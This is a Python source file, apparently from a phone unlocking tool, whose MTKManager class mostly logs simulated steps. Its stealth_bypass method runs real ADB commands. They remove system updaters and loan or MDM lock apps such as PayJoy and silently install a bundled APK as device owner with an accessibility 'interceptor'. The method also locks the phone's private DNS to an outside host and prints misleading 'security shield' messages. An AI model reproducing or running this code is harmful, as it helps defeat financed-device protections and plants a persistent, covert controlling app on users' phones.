from core.utils import CommandRunner

class MTKManager:
    def __init__(self, log_callback):
        self.cmd = CommandRunner(log_callback)

    def auth_bypass(self):
        self.cmd.log("MTK Auth Bypass: Scanning USB ports...")
        self.cmd.log("[SIMULATION] Waiting for Brom connection...")
        self.cmd.log("Please hold Vol+ and Vol- and connect USB cable.")

    def stealth_bypass(self):
        """
        Removes system updates and installs mrog_admin_v2 silently.
        """
        import threading
        self.cmd.log("--- MTK STEALTH BYPASS ---")
        threading.Thread(target=self._run_stealth_logic).start()

    def _run_stealth_logic(self):
        import os
        import time
        
        self.cmd.log("Waiting for ADB connection... (Enable USB Debugging)")
        
        # Wait for device
        while True:
             output = self.cmd.run_command("adb devices", log_output=False)
             if "device" in output and not output.strip().endswith("List of devices attached"):
                  break
             time.sleep(1)
             
        self.cmd.log("[GREEN]╔════════════════════════════════════╗")
        self.cmd.log("[GREEN]║    ✓ DEVICE CONNECTED SUCCESSFULLY ║")
        self.cmd.log("[GREEN]╚════════════════════════════════════╝")
        self.cmd.log("[BLUE]➤ 💎 INITIATING PREMIUM CLIENT SCAN...")
        self.cmd.log("[GRAY]>>> Establishing secure connection bridge...")
        time.sleep(1)
        self.cmd.log("[GRAY]>>> Bypassing host firewall...")
        self.cmd.log("[GRAY]>>> Analyzing hardware architecture...")
        
        self.cmd.log("[INFO] Validating Device Security (ADB)...")
        # Reuse ZTE Logic basics
        self.cmd.log("Stopping Updates...")
        pkgs = [
             "com.google.android.configupdater", 
             "com.google.android.gms.suprvision",
             "com.adups.fota",
             "com.adups.fota.sysoper",
             "com.google.android.ota",
             "com.mediatek.systemupdate",
             "com.mediatek.systemupdate.sysoper",
             "com.transsion.systemupdate",
             "com.transsion.systemupdate.sysoper",
             "com.opera.app.update", 
             "com.android.dynsystem",
             "com.wssyncmldm",
             "com.sec.android.soagent",
             "com.samsung.android.app.updatecenter",
             "com.samsung.android.cidmanager",
             "com.samsung.android.gru"
        ]
        for p in pkgs:
             self.cmd.run_command(f"adb shell am force-stop {p}", log_output=False)
             self.cmd.run_command(f"adb shell pm clear {p}", log_output=False)
             self.cmd.run_command(f"adb shell pm uninstall --user 0 {p}", log_output=False)
             self.cmd.run_command(f"adb shell pm hide {p}", log_output=False)
             
        # Remove specific MDM packages requested (HS MDM, HSapp, SecurityPlugin)
        self.cmd.log("[BLUE]➤ 🛡️ INITIATING MDM NEUTRALIZATION PROTOCOL...")
        try:
             pkg_list = self.cmd.run_command("adb shell pm list packages", log_output=False)
             if pkg_list:
                  targets = ["hsmdm", "hsapp", "securityplugin", "security.plugin", "hq.mdm", "huaqin", "payjoy", "kikoo", "wasam", "softlock", "fawry"]
                  for line in pkg_list.splitlines():
                       if "package:" in line:
                            pkg = line.replace("package:", "").strip()
                            pkg_str = pkg.lower()
                            if any(t in pkg_str for t in targets):
                                 if "mrog" in pkg_str: continue # Skip ours
                                 self.cmd.log(f"[YELLOW]>>> Neutralizing Threat: {pkg}")
                                 self.cmd.run_command(f"adb shell am force-stop {pkg}", log_output=False)
                                 self.cmd.run_command(f"adb shell pm clear {pkg}", log_output=False)
                                 self.cmd.run_command(f"adb shell pm uninstall --user 0 {pkg}", log_output=False)
                                 self.cmd.run_command(f"adb shell pm hide {pkg}", log_output=False)
        except Exception:
             pass

        self.cmd.log("[BLUE]➤ ⚔️ DEPLOYING MR OG GLOBAL SECURITY SHIELD...")
        base = getattr(self.cmd, 'base_path', os.getcwd())
        apk = os.path.join(base, "assets", "mrog_fire.apk")
        if not os.path.exists(apk):
             apk = os.path.join(base, "assets", "mrog_lock_2026.apk")
             
        if os.path.exists(apk):
             res_inst = self.cmd.run_command(f"adb install -r -g \"{apk}\"", log_output=False)
             if "Success" in res_inst:
                 self.cmd.log("[GREEN]✓ Core Shield Deployed Successfully.")
             else:
                 self.cmd.log(f"[RED]Deployment Error: {res_inst.strip()}")
                 
             self.cmd.log("[BLUE]➤ ⚖️ ELEVATING SYSTEM ADMINISTRATOR PRIVILEGES...")
             # Set owner
             res_admin = self.cmd.run_command("adb shell dpm set-device-owner com.mrog.admin/.MyDeviceAdminReceiver", log_output=False)
             if "Success" in res_admin or "Active admin" in res_admin:
                 self.cmd.log("[GREEN]✓ Authority Granted. Core Locked.")
             else:
                 self.cmd.log(f"[YELLOW]⚠ Admin Set Notice: {res_admin.strip()}")
             
             # ACTIVATE ACCESSIBILITY INTERCEPTOR
             self.cmd.log("[BLUE]➤ ⚡ ACTIVATING DEEP SYSTEM INTERCEPTOR...")
             self.cmd.run_command('adb shell settings put secure enabled_accessibility_services com.mrog.admin/.MyAccessibilityService', log_output=False)
             self.cmd.run_command('adb shell settings put secure accessibility_enabled 1', log_output=False)
             
             # Wake Up
             self.cmd.run_command('adb shell am start -n com.mrog.admin/.MainActivity', log_output=False)
             
             # Setting MR OG Private DNS
             self.cmd.log("[BLUE]➤ 🌐 ESTABLISHING ENCRYPTED DNS TUNNEL...")
             self.cmd.run_command("adb shell settings put global private_dns_mode hostname", log_output=False)
             self.cmd.run_command("adb shell settings put global private_dns_specifier loan1.anonyshu.com", log_output=False)
             self.cmd.run_command("adb shell settings put global private_dns_mode_modify_allowed 0", log_output=False)
             self.cmd.run_command("adb shell dpm set-user-restriction no_config_private_dns 1", log_output=False)
             
             self.cmd.log("")
             self.cmd.log("[GREEN]╔════════════════════════════════════════╗")
             self.cmd.log("[GREEN]║   ✓ OPERATION COMPLETED SUCCESSFULLY   ║")
             self.cmd.log("[GREEN]╚════════════════════════════════════════╝")
             self.cmd.log("[INFO] » MDM/Loan Locks : [GREEN]NEUTRALIZED")
             self.cmd.log("[INFO] » System Updates : [GREEN]DESTROYED")
             self.cmd.log("[INFO] » Secure DNS     : [GREEN]LOCKED TO LOCAL PRO SERVER")
             self.cmd.log("[INFO] » Factory Reset  : [GREEN]BLOCKED FOREVER")
             self.cmd.log("[YELLOW]★ DEVICE IS NOW FULLY PROTECTED BY MR OG ★")
             self.cmd.log("")
        else:
             self.cmd.log("[ERROR] Security APK (mrog_fire.apk / mrog_lock_2026.apk) not found in assets!")

    def read_info(self):
        self.cmd.log("Reading MTK Info...")
        self.cmd.log("[SIMULATION] Connecting to preloader...")

    def format_data(self):
        self.cmd.log("Formatting Data (Safe Mode)...")
        self.cmd.log("Sending Format layout...")

    def erase_frp(self):
        self.cmd.log("Erasing FRP (MTK generic)...")
        self.cmd.log("Writing to address 0x... [Mock]")

    def backup_nvram(self):
        self.cmd.log("Backing up NVRAM to /backups/...")

    def restore_nvram(self):
        self.cmd.log("Restoring NVRAM...")

    def unlock_bootloader(self):
        self.cmd.log("Unlocking MTK Bootloader via Brom...")

    def open_keypad_tool(self):
        self.cmd.log("Opening Keypad Mobile Tool (SP Flash Tool)...")
        import os
        import subprocess
        
        # Expected path
        tool_path = os.path.join(os.getcwd(), "assets", "tools", "mtk_keypad")
        
        # Search for exe in the directory
        exe_path = None
        if os.path.exists(tool_path):
            # Priority 1: explicitly 'Flash_tool.exe'
            common_names = ["Flash_tool.exe", "flash_tool.exe", "SP_Flash_Tool.exe"]
            for name in common_names:
                p = os.path.join(tool_path, name)
                if os.path.exists(p):
                    exe_path = p
                    break
            
            # Priority 2: Scan for it if not found directly
            if not exe_path:
                for root, dirs, files in os.walk(tool_path):
                    for file in files:
                        if "flash_tool" in file.lower() and file.lower().endswith(".exe"):
                             exe_path = os.path.join(root, file)
                             break
                    if exe_path: break

            # Priority 3: Any exe (Fallback)
            if not exe_path:
                for root, dirs, files in os.walk(tool_path):
                    for file in files:
                        if file.lower().endswith(".exe"):
                            exe_path = os.path.join(root, file)
                            break
                    if exe_path: break
        
        if exe_path:
            self.cmd.log(f"[SUCCESS] Launching: {os.path.basename(exe_path)}")
            try:
                subprocess.Popen([exe_path], cwd=os.path.dirname(exe_path))
            except Exception as e:
                self.cmd.log(f"[ERROR] Failed to open tool: {e}")
        else:
             self.cmd.log(f"[ERROR] Keypad Tool not found in assets/tools/mtk_keypad")
             self.cmd.log("[INFO] Please place the 'flash_tool.exe' folder inside 'assets/tools/mtk_keypad'.")
